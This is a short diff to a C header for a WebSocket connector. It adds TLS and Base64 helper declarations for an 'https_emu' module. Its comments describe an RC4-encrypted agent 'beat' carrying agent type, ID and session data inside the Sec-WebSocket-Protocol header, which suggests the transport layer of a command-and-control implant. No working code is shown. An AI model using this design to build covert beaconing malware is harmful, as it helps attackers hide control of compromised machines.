@@ -68,6 +68,17 @@ void ws_disconnect(ws_connector_t* ws);
 /// Base64 decode. Returns decoded length or -1 on error.
 int ws_b64_decode(const char* in, size_t in_len, uint8_t* out, size_t out_cap);
 
+/// TLS handshake on an already-connected fd (SNI = host). Used by https_emu.
+int ws_tls_handshake(ws_connector_t* ws, int fd, const char* host);
+
+/// TLS send/recv helpers. Used by https_emu.
+int ws_tls_send(ws_connector_t* ws, const uint8_t* data, size_t len);
+int ws_tls_recv(ws_connector_t* ws, uint8_t* buf, size_t cap);
+int ws_tls_recv_exact(ws_connector_t* ws, uint8_t* buf, size_t len);
+
+/// Base64 encode (standard alphabet). Used by https_emu. 0 on success.
+int ws_b64_encode_pub(const uint8_t* in, size_t in_len, char* out, size_t out_cap);
+
 /// Build a WS beat for Sec-WebSocket-Protocol header.
 /// RC4-encrypts [agentType 4B][agentId 4B][sessionInfo] with profile enc_key,
 /// then base64-encodes. Matches server parseBeat().
